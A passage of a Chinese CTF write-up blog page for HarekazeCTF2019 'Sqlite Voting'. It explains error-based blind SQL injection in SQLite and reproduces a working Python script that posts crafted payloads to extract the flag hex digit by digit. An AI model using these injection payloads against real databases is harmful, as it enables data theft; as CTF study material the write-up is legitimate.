+<li><p>再利用 <code>replace(length(replace(flag,payload,&#39;&#39;))),84,&#39;&#39;)</code> 这个语句进行判断</p>
+</li>
+<li><p>如果 flag 不包含 payload ，那么得到的 <code>length</code> 必为 84 ，最外面的 <code>replace</code> 将返回 <code>false</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0</code> ，它不报错</p>
+</li>
+<li><p>如果 flag 包含 payload ，那么 <code>replace(flag, payload, &#39;&#39;)</code> 将 flag 中的 payload 替换为空，得到的 <code>length</code> 必不为 84 ，最外面的 <code>replace</code> 将返回 <code>true</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0x8000000000000000</code> 令其报错</p>
+</li>
+<li><p>以上就可以根据报错爆破出 flag，最后附上出题人脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">'http://domain/vote.php'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">'[+] length:'</span>, l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b'flag&#123;'</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'0123456789ABCDEF'</span>:</span><br><span class="line">    t = <span class="string">'||'</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">'0123456789'</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  print(<span class="string">f'[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>'</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line">print(<span class="string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
+          
+            <a href="/tags/buuoj/" rel="tag"><i class="fa fa-tag"></i> buuoj</a>
+          
+            <a href="/tags/SQL/" rel="tag"><i class="fa fa-tag"></i> SQL</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/14/代码审计/" rel="next" title="CodeBreaking 代码审计">
+                <i class="fa fa-chevron-left"></i> CodeBreaking 代码审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NjMzNS8yMjg0Ng=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/toux.jpg" alt="peri0d">
+            
+              <p class="site-author-name" itemprop="name">peri0d</p>
+              <p class="site-description motion-element" itemprop="description">须知少时凌云志，曾许人间第一流。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">1.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">2.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">3.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HarekazeCTF2019-Sqlite-Voting"><span class="nav-number">4.</span> <span class="nav-text">[HarekazeCTF2019]Sqlite Voting</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">peri0d</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("JWhbFv0yrTCtI3vudAvJ8lAl-gzGzoHsz", "kmmUrzx5ONjNcOwBP2lF6tun");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
